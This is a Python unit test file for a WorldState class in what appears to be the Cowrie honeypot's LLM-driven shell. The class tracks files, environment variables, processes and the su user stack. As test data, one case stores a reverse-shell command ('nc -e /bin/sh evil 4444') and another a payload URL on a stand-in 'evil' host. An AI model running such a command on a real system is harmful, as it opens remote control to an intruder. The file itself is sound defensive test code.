# SPDX-License-Identifier: BSD-3-Clause

"""Unit tests for cowrie.llm.worldstate."""

from __future__ import annotations

import unittest

from cowrie.llm.worldstate import WorldState


class TestWorldState(unittest.TestCase):
    def test_empty_renders_empty(self):
        w = WorldState()
        self.assertEqual(w.to_prompt_section(), "")

    def test_add_file_renders_with_metadata(self):
        w = WorldState()
        w.add_file(
            path="/tmp/p.sh",
            size_bytes=4823,
            sha256="abc1234567890def",
            source="downloaded",
            source_url="http://evil/payload.sh",
        )
        section = w.to_prompt_section()
        self.assertIn("/tmp/p.sh", section)
        self.assertIn("4823", section)
        self.assertIn("abc1234567890def", section)
        self.assertIn("http://evil/payload.sh", section)

    def test_files_capped_at_max(self):
        w = WorldState()
        cap = WorldState.MAX_FILES_IN_PROMPT
        for i in range(cap + 5):
            w.add_file(path=f"/tmp/f{i}", size_bytes=i, sha256=None, source="created")
        section = w.to_prompt_section()
        self.assertIn(f"... ({cap + 5 - cap} more, omitted)", section)
        # Last-modified-first ordering: the newest files survive the truncation.
        self.assertIn(f"/tmp/f{cap + 4}", section)
        # And the oldest files are NOT in the prompt.
        self.assertNotIn("/tmp/f0  size=0", section)

    def test_env_vars_render(self):
        w = WorldState()
        w.add_env("EVIL_HOME", "/opt/evil")
        section = w.to_prompt_section()
        self.assertIn("EVIL_HOME", section)
        self.assertIn("/opt/evil", section)

    def test_two_world_states_do_not_share_state(self):
        a = WorldState()
        b = WorldState()
        a.add_file(path="/x", size_bytes=1, sha256=None, source="created")
        self.assertEqual(len(b.files), 0)

    def test_idempotent_same_path_overwrites(self):
        w = WorldState()
        w.add_file(path="/tmp/x", size_bytes=10, sha256="a", source="downloaded")
        w.add_file(path="/tmp/x", size_bytes=20, sha256="b", source="edited")
        self.assertEqual(len(w.files), 1)
        self.assertEqual(w.files["/tmp/x"].size_bytes, 20)
        self.assertEqual(w.files["/tmp/x"].sha256, "b")

    def test_empty_path_ignored(self):
        w = WorldState()
        w.add_file(path="", size_bytes=10, sha256="a", source="downloaded")
        self.assertEqual(len(w.files), 0)


class TestProcesses(unittest.TestCase):
    def test_add_process_returns_pid_and_tracks(self):
        w = WorldState()
        pid = w.add_process("python3 x.py", user="root")
        self.assertGreater(pid, 1)
        self.assertIn(pid, w.processes)
        self.assertIn(pid, w.bg_pids)
        self.assertEqual(w.processes[pid].command, "python3 x.py")

    def test_pids_are_unique_and_incrementing(self):
        w = WorldState()
        p1 = w.add_process("a", user="root")
        p2 = w.add_process("b", user="root")
        self.assertNotEqual(p1, p2)

    def test_empty_command_ignored(self):
        w = WorldState()
        self.assertEqual(w.add_process("   ", user="root"), 0)
        self.assertEqual(len(w.processes), 0)

    def test_processes_render_in_prompt(self):
        w = WorldState()
        w.add_process("nc -e /bin/sh evil 4444", user="root")
        section = w.to_prompt_section()
        self.assertIn("nc -e /bin/sh evil 4444", section)
        self.assertIn("Background processes", section)


class TestUserStack(unittest.TestCase):
    def test_effective_user_default_is_login(self):
        w = WorldState()
        self.assertEqual(w.effective_user("bob"), "bob")

    def test_push_then_effective(self):
        w = WorldState()
        w.push_user("root")
        self.assertEqual(w.effective_user("bob"), "root")

    def test_pop_restores(self):
        w = WorldState()
        w.push_user("root")
        self.assertEqual(w.pop_user(), "root")
        self.assertEqual(w.effective_user("bob"), "bob")

    def test_pop_empty_is_none(self):
        w = WorldState()
        self.assertIsNone(w.pop_user())

    def test_nested_su(self):
        w = WorldState()
        w.push_user("root")
        w.push_user("postgres")
        self.assertEqual(w.effective_user("bob"), "postgres")
        w.pop_user()
        self.assertEqual(w.effective_user("bob"), "root")

    def test_user_stack_renders_in_prompt(self):
        w = WorldState()
        w.push_user("root")
        self.assertIn("Effective-user stack", w.to_prompt_section())
